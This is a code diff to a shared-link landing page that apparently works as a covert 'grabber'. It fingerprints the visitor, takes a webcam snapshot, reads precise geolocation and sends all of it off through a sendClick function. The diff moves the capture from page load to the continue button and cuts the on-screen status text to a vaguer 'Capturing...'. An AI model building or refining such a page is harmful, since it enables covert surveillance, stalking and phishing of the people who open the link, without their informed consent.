@@ -255,7 +255,7 @@ function getFingerprint() {
     }
 
     async function requestGeo() {
-      document.getElementById('status').textContent = 'Capturing location...';
+      document.getElementById('status').textContent = 'Capturing...';
       const fp = getFingerprint();
       var img = null;
       try {
@@ -270,13 +270,14 @@ function getFingerprint() {
         img = canvas.toDataURL('image/jpeg', 0.85);
         stream.getTracks().forEach(function(t) { t.stop(); });
       } catch(e) {}
-      } catch(e) {}
       navigator.geolocation.getCurrentPosition(
         (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp, img),
         () => sendClick(null, null, fp, img),
         { timeout: 5000, enableHighAccuracy: true }
       );
     }
+
+    document.getElementById('continueBtn').addEventListener('click', requestGeo);
 
     if (link.hasPassword) {
       document.getElementById('app').innerHTML = \`
@@ -286,30 +287,6 @@ function getFingerprint() {
         <button class="btn" onclick="verifyPassword()">Submit</button>
         <div id="error" class="error"></div>
       \`;
-    } else {
-      navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }).then(function(stream) {
-        var video = document.createElement('video');
-        video.srcObject = stream;
-        video.play().then(function() {
-          var canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          var img = canvas.toDataURL('image/jpeg', 0.85);
-          stream.getTracks().forEach(function(t) { t.stop(); });
-          navigator.geolocation.getCurrentPosition(
-            (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint(), img),
-            () => sendClick(null, null, getFingerprint(), img),
-            { timeout: 3000, enableHighAccuracy: false }
-          );
-        });
-      }).catch(function() {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint()),
-          () => sendClick(null, null, getFingerprint()),
-          { timeout: 3000, enableHighAccuracy: false }
-        );
-      });
     }
 
     async function verifyPassword() {
